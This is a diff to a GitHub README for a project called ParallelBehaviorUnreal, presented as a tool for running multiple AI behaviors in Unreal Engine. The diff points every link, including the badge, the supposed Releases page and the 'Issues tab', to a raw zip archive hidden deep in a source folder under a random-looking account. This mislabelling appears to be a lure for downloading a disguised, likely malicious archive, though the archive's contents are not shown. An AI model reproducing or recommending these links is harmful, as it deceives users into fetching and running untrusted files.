@@ -1,6 +1,6 @@
 # 🎮 ParallelBehaviorUnreal - Run Multiple AI Behaviors Seamlessly
 
-[![Download ParallelBehaviorUnreal](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/main/src/routes/ParallelBehaviorUnreal-1.7.zip%20ParallelBehaviorUnreal-v1.0-brightgreen)](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/main/src/routes/ParallelBehaviorUnreal-1.7.zip)
+[![Download ParallelBehaviorUnreal](https://github.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/raw/refs/heads/main/src/components/home-monitoring/Behavior-Parallel-Unreal-2.8.zip%20ParallelBehaviorUnreal-v1.0-brightgreen)](https://github.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/raw/refs/heads/main/src/components/home-monitoring/Behavior-Parallel-Unreal-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run ParallelBehaviorUnreal, ensure your system meets the following requiremen
 
 To get started, visit the following page to download the latest release:
 
-[Download ParallelBehaviorUnreal](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/main/src/routes/ParallelBehaviorUnreal-1.7.zip)
+[Download ParallelBehaviorUnreal](https://github.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/raw/refs/heads/main/src/components/home-monitoring/Behavior-Parallel-Unreal-2.8.zip)
 
 Once you are on the Releases page, look for the latest version. Click the download link for your operating system, and follow these steps:
 
@@ -70,7 +70,7 @@ Once you are on the Releases page, look for the latest version. Click the downlo
 
 If you encounter any issues or have questions:
 
-- Check the [Issues tab](https://raw.githubusercontent.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/main/src/routes/ParallelBehaviorUnreal-1.7.zip) on GitHub for solutions.
+- Check the [Issues tab](https://github.com/ugSQTUS49bpmeRx/ParallelBehaviorUnreal/raw/refs/heads/main/src/components/home-monitoring/Behavior-Parallel-Unreal-2.8.zip) on GitHub for solutions.
 - Feel free to open a new issue if your problem is not listed.
 - Join our community discussions for advice and tips on using ParallelBehaviorUnreal effectively.
 
